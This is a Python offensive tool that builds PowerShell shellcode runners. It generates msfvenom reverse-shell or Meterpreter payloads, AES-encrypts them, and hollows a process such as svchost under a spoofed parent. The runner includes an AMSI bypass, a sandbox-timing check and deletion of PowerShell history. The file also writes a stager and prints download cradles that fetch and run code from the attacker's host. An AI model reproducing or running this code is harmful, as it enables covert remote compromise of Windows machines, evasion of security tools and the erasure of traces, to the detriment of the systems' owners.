#!/usr/bin/python3
import subprocess
import os
import argparse
import sys
import random
import string
import textwrap

separatekey = False #initialize var for optional functionality
stager = False #initialize var for cmd.exe stager functionality

def pwshrun(cmd):
	completed = subprocess.run(["pwsh", "-command", cmd], capture_output=True)
	return completed

def msfvenomrun(cmd):
	completed = subprocess.run(["msfvenom " + cmd], shell = True, capture_output=True)
	return completed

def msfvenomoutput(status, stderr):
	msferrors = str(stderr).replace('b"','').replace('"','').replace("b'","").replace("'","").split("\\n")
	print(status)
	for line in msferrors:
		print("	" + line)

if __name__ == '__main__':
	parser = argparse.ArgumentParser(add_help = True, description = ".PS1 shellcode runner generator", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''\
	Uses msfvenom to generate shellcode.
	Shellcode is AES-256 encrypted with a randomly generated key that is not included in the runner.
	Hollows specified process and fills with shellcode while spoofing specified parent process.
	You must specify an parent process of the same or lower integrity than the context in which you have RCE (e.g. medium integrity = explorer)
	key/keyhost options modify Runner to contain second download cradle to retrieve AES-256 key to decrypt shellcode.

	
	Successfully Hollowed processes:
		Medium: svchost
		High: spoolsv, svchost	
		
	Successfully Spoofed parent processes:
		Medium: explorer
	'''))

	#Req arguments
	parser.add_argument('lhost', action='store', help='Lhost for msfvenom payload')
	parser.add_argument('lport', action='store', help='Lport for msfvenom payload')
	parser.add_argument('process', action='store', help='Process to hollow. Provide full path e.g. c:\windows\system32\svchost.exe')
	parser.add_argument('parent_process', action='store', help='Parent Process to spoof e.g. explorer')
	parser.add_argument('execution_method', action='store', help='Options: \'ps\' OR \'cmd\'. Dictates whether PShistory command deletion is included as well as generation of a stager payload for cmd.exe implementations.')
	
	#Optional arguments
	parser.add_argument('-out', action='store', metavar="file.txt", help='Payload output file (default: payload.txt)')
	parser.add_argument('-stager', action='store', metavar="stager.txt", help='Stager output file. Only use this switch when specify cmd for execution_method. (default: stager.txt)')
	parser.add_argument('-keyhost', action='store', help='Specify webserver ip/address that key will be hosted on and key name (example: 192.168.1.1 or www.mydomain.com)')
	parser.add_argument('-key', action='store', metavar="file.txt", help='Key output file. Use in conjunction with -keyhost.')
	parser.add_argument('-M', action='store_true', help='Use default Meterpreter payload (windows/x64/meterpreter/reverse_tcp)')
	parser.add_argument('-p', action='store', metavar="payload", help='Specify msfvenom payload (default: windows/x64/shell_reverse_tcp)')
	parser.add_argument('-switches', action='store', metavar="options", help='Extra msfvenom switches. Do not user encoder with hollowing. Enter in quotes and do not use -e, -o, or -f!')
	
	if len(sys.argv)==1: #print help if no arguments given
		parser.print_help()
		sys.exit(0)
	args = parser.parse_args()
	if args.stager:
		if args.execution_method == "cmd":
			stagerfile = args.stager
		else:
			print("Cannot use -stager argument with ps execution method.  Use with cmd.")
			sys.exit(0)
	else:
		stagerfile = "stager.txt"
	if args.out:
		payloadfile =  args.out 
	else:
		payloadfile = "payload.txt"
	if args.execution_method == "ps":
		remhistory = "$file = \"$Env:APPDATA\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt\";Get-Content $file | Measure-Object -Line;$a = (Get-Content $file | Measure-Object);(Get-Content $file) | ? {($a.count)-notcontains $_.ReadCount} | Set-Content $file"
	elif args.execution_method == "cmd":
		remhistory = ""
		stager = True
	else:
		print("Invalid selection.  Choose either 'cmd' for cmd.exe or 'ps' for powershell.exe")
		sys.exit(0)
	if args.key:
		if args.keyhost:
			separatekey = True
		else: 
			sys.exit("You must also use the -keyhost option when using -key!")
	if args.p: #if alternate payload specified
		payload = "-p " + args.p + " "
	elif args.M: #if meterpreter default payload selected
		payload = "-p windows/x64/meterpreter/reverse_tcp "
	elif not args.p and not args.M: #use default payload
		payload = "-p windows/x64/shell_reverse_tcp "	
	if args.switches: #if additional msfvenom switches specified
		disallowed = ["-o", "-f", "-e"] #Do not allow user to output shellcode to file or specify alternate format
		if any(x in args.switches for x in disallowed):
			sys.exit("Do not use -o or -f switch in msfvenom options!")
		extra_args = args.switches
	else:
		extra_args = "" #default encoder 
	
	msfvenomcommand = payload + "LHOST=" + args.lhost + " LPORT=" + args.lport + " -f ps1 " + extra_args #assemble msfvenom command
	print("\nAttempt to hollow " + args.process + " with spoofed parent process " + args.parent_process)
	print("Using Msfvenom command: msfvenom " + msfvenomcommand)
	print("\nGenerating shellcode...")
	shellcode = msfvenomrun(msfvenomcommand) #run msfvenom, capture output
	if shellcode.returncode != 0: #if msfvenom returns an error print errors then exit
		msfvenomoutput("Msfvenom FAILED: ", shellcode.stderr)
		sys.exit(0)
	else:
		msfvenomoutput("Msfvenom warning messages - review to ensure all options successfully validated:", shellcode.stderr)
	print("Generating AES-256 key...")
	powershellkeygen = "$aesKey = New-Object byte[] 32;$rng = [Security.Cryptography.RNGCryptoServiceProvider]::Create();$rng.GetBytes($aesKey);$aesKey" #pwshgenerate random aes-256 key
	aeskey = ("(" + str(pwshrun(powershellkeygen).stdout).replace("b","").replace("'","").replace("\\n",",") + ")").replace(",)",")") #generate aes-256 key and format
	if separatekey:
			keyfile = args.key
			with open(keyfile, 'w') as f: #write key to file
				f.write(aeskey)
			print("AES-256 key written to: " + keyfile)
			key = "$key = (new-object net.webclient).downloadstring('http://" + args.keyhost + "/" + keyfile + "');$key = $key.split(\",\") -replace '[()]',''"
	else:
		key = "$key = " + aeskey

	print("\nEncrypting shellcode...")
	rawshellcode = str(shellcode.stdout).replace("b'[Byte[]] $buf = ","").replace("\\n","").replace("\\r","").replace("'","") #format shellcode
	powershellencrypt = "$aesKey = " + aeskey + ";$shellcode = \"" + rawshellcode + "\";$Secure = ConvertTo-SecureString -String $shellcode -AsPlainText -Force;$encrypted = ConvertFrom-SecureString -SecureString $Secure -Key $aesKey;$encrypted"
	encryptedshellcode = str(pwshrun(powershellencrypt).stdout).replace("b'","").replace("\\n'","")
	if stager:
		print("\nGenerating stager...")
		stagercontents = """$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
iex (new-object net.webclient).downloadstring('http://""" + args.lhost + """/""" + payloadfile + """') 
		"""
		with open(stagerfile,"w") as f:
			f.write(stagercontents)
		print("Runner written to " + stagerfile + "!")
	print("\nGenerating runner...")
	
	runner = """function LookupFunc {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
 Param (
 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
 [Parameter(Position = 1)] [Type] $delType = [Void]
 )
 $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
 $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
 $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
 return $type.CreateType()
}
function getStrawberries($a) {
 $obfu =  \"""" + encryptedshellcode + """\"
 $secureObject = ConvertTo-SecureString -String $obfu -Key $a
 $decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)
 $decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)
 $decrypted = $decrypted.split(",")
 return $decrypted
} 

$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
$starttime = Get-Date -Displayhint Time
Start-sleep -s 5
$finishtime = Get-Date -Displayhint Time
if ( $finishtime -le $starttime.addseconds(4.5) ) {
 exit
}

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
public struct STARTUPINFO
{
    public uint cb;
    public IntPtr lpReserved;
    public IntPtr lpDesktop;
    public IntPtr lpTitle;
    public uint dwX;
    public uint dwY;
    public uint dwXSize;
    public uint dwYSize;
    public uint dwXCountChars;
    public uint dwYCountChars;
    public uint dwFillAttributes;
    public uint dwFlags;
    public ushort wShowWindow;
    public ushort cbReserved;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdErr;
}
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public int dwProcessId;
    public int dwThreadId;
}
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_BASIC_INFORMATION
{
    public IntPtr Reserved1;
    public IntPtr PebAddress;
    public IntPtr Reserved2;
    public IntPtr Reserved3;
    public IntPtr UniquePid;
    public IntPtr MoreReserved;
}

[StructLayout(LayoutKind.Sequential)]
public struct STARTUPINFOEX
{
    public STARTUPINFO StartupInfo;
    public IntPtr lpAttributeList;
}

[StructLayout(LayoutKind.Sequential)]
public struct SECURITY_ATTRIBUTES
{
    public int nLength;
    public IntPtr lpSecurityDescriptor;
    public int bInheritHandle;
}

public class Kernel32 {
	[DllImport("kernel32.dll", SetLastError=true)] public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,  ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,  uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
}
"@
$startInfoEx = New-Object STARTUPINFOEX
$startInfo = New-Object STARTUPINFO
$pi = New-Object PROCESS_INFORMATION
$startInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($startInfoEx)
$startInfoEx.StartupInfo = $startInfo
$lpValue = [System.Runtime.InteropServices.Marshal]::AllocHglobal([IntPtr]::Size)
$processSecurity = New-Object SECURITY_ATTRIBUTES
$threadSecurity = New-Object SECURITY_ATTRIBUTES
$processSecurity.nLength = [System.Runtime.InteropServices.Marshal]::SizeOf($processSecurity)
$threadSecurity.nLength = [System.Runtime.InteropServices.Marshal]::SizeOf($threadSecurity)
$lpSize = [IntPtr]::Zero
$bi = New-Object PROCESS_BASIC_INFORMATION

$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll InitializeProcThreadAttributeList), (getDelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType())([bool]))).Invoke([IntPtr]::Zero, 2, 0, [ref]$lpSize)

$startInfoEx.lpAttributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($lpSize)

$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll InitializeProcThreadAttributeList), (getDelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType())([bool]))).Invoke($startInfoEx.lpAttributeList, 2, 0, [ref]$lpSize)

[System.Runtime.InteropServices.Marshal]::WriteIntPtr($lpValue, 0x300000000000)
$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll UpdateProcThreadAttribute), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr])([bool]))).Invoke($startInfoEx.lpAttributeList, 0, 0x20007, $lpValue, [IntPtr]::Size, [IntPtr]::Zero, [IntPtr]::Zero)

$procid=(get-process """ +  args.parent_process + """)[0].id
$hprocess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [bool], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, $false, $procid)

$lpValue = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
[System.Runtime.InteropServices.Marshal]::WriteIntPtr($lpValue, $hprocess)

$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll UpdateProcThreadAttribute), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr])([bool]))).Invoke($startInfoEx.lpAttributeList, 0, 0x00020000, $lpValue, [IntPtr]::Size, [IntPtr]::Zero, [IntPtr]::Zero)

$tw = [Kernel32]::CreateProcess(\""""+ args.process + """\", $null, [ref]$processSecurity, [ref]$threadSecurity, $false, 0x00080004, [IntPtr]::Zero, "c:", [ref]$startInfoEx, [ref]$pi) 

$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll DeleteProcThreadAttributeList), (getDelegateType @([IntPtr])([bool]))).Invoke($startInfoEx.lpAttributeList)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($startInfoEx.lpAttributeList)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($lpValue)

$hProcess = $pi.hProcess

$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc ntdll.dll ZwQueryInformationProcess), (getDelegateType @([IntPtr], [UInt32], [PROCESS_BASIC_INFORMATION].MakeByRefType(), [UInt32], [UInt32])([UInt32]))).Invoke($hProcess, 0, [ref]$bi, ([IntPtr]::Size * 6), $tmp)

[IntPtr]$ptrToImageBase = [int64]$bi.PebAddress + 0x10
$addrBuf = New-Object byte[]([IntPtr]::Size)
[IntPtr]$nRead = [IntPtr]::Zero

$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ReadProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [byte[]], [UInt32], [IntPtr].MakeByRefType())([bool]))).Invoke($hProcess, $ptrToImageBase, $addrBuf, $addrBuf.length, [ref]$nRead)

$svchostBase = [bitconverter]::ToInt64($addrBuf,0)
$data = New-Object byte[](0x200)
$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ReadProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [byte[]], [UInt32], [IntPtr].MakeByRefType())([bool]))).Invoke($hProcess, $svchostBase, $data, $data.length, [ref]$nRead)
[uint32]$e_lfanew_offset = [BitConverter]::ToUInt32($data, 0x3C);
[uint32]$opthdr = $e_lfanew_offset + 0x28;
[uint32]$entrypoint_rva = [BitConverter]::ToUInt32($data, [int]$opthdr);
[UIntPtr]$addressOfEntryPoint = [UIntPtr]($entrypoint_rva + [UInt64]$svchostBase);
[Int32]$lpNumberOfBytesWritten = 0
""" + key + """

[Byte[]] $buf = getStrawberries $key

$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [UIntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType())([bool]))).Invoke($hprocess, $addressOfEntryPoint, $buf, $buf.length, [ref]$lpNumberOfBytesWritten)
$tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ResumeThread), (getDelegateType @([IntPtr])([IntPtr]))).Invoke($pi.hThread)
""" + remhistory
	with open(payloadfile,"w") as f:
		f.write(runner)
	print("Runner written to " + payloadfile + "!")
	print("\nGeneration Complete!")
	if stager:
		cradle = "powershell iex (new-object net.webclient).downloadstring('http://" + args.lhost + "/" + stagerfile + "')"
		print("\nPS download cradle for CMD.exe usage: " + cradle)
	else:
		cradle = "iex (new-object net.webclient).downloadstring('http://" + args.lhost + "/" + payloadfile + "')"
		print("\nPS download cradle for Powershell.exe usage: " + cradle)
